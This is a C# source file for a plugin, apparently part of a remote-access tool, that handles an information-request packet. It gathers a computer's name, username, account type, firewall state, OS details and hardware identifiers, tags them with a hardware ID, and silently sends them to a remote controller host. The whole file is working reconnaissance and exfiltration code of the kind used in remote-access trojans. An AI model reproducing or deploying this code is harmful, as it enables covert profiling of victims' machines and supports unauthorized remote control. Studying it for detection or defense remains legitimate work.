using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Collections.Generic;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static Dictionary<string, List<string>> cpuInformation;

        static Launch() 
        {
            cpuInformation = new Dictionary<string, List<string>>();
        }

        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.MISC_INFORMATION:
                    cpuInformation.Add("CPU", new List<string>());
                    string s = HardwareInformation.CPUInformation();
                    cpuInformation["CPU"].Add(s);
                    InformationPacket informationPacket = new InformationPacket(cpuInformation, loadingAPI.baseIp, loadingAPI.HWID);

                    informationPacket.information.systemInformation.systemInformation = new Dictionary<string, string>();
                    informationPacket.information.systemInformation.systemInformation.Add("PC name", Helpers.GetPcName());
                    informationPacket.information.systemInformation.systemInformation.Add("Username", Helpers.GetUserName());
                    informationPacket.information.systemInformation.systemInformation.Add("Registered user", Helpers.GetWMIInformation("RegisteredUser"));
                    informationPacket.information.systemInformation.systemInformation.Add("Account type", Helpers.GetUserType().ToString());
                    informationPacket.information.systemInformation.systemInformation.Add("Firewall", Helpers.GetFirewall());

                    informationPacket.information.systemInformation.systemInformation.Add("System drive", Helpers.GetWMIInformation("SystemDrive"));
                    informationPacket.information.systemInformation.systemInformation.Add("System path", Helpers.GetWMIInformation("SystemDirectory"));
                    informationPacket.information.systemInformation.systemInformation.Add("OS architecture", Helpers.GetWMIInformation("OSArchitecture"));
                    informationPacket.information.systemInformation.systemInformation.Add("System version", Helpers.GetWMIInformation("Version"));
                    informationPacket.information.systemInformation.systemInformation.Add("OS type", Helpers.GetOsType());
                    informationPacket.information.systemInformation.systemInformation.Add("OS manufacturer", Helpers.GetWMIInformation("Manufacturer"));
                    informationPacket.information.systemInformation.systemInformation.Add("OS name", Helpers.GetWMIInformation("Caption"));

                    informationPacket.information.hardwareInformation.hardwareInformation = new Dictionary<string, string>();
                    informationPacket.information.hardwareInformation.hardwareInformation.Add("GPU", Helpers.GetGpuName());
                    informationPacket.information.hardwareInformation.hardwareInformation.Add("Resolution", Helpers.GetResolution());
                    informationPacket.information.hardwareInformation.hardwareInformation.Add("Motherboard", Helpers.GetMainboardName());
                    informationPacket.information.hardwareInformation.hardwareInformation.Add("Bios", Helpers.GetBiosDescription());

                    ClientSender(loadingAPI.host, loadingAPI.key, informationPacket);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
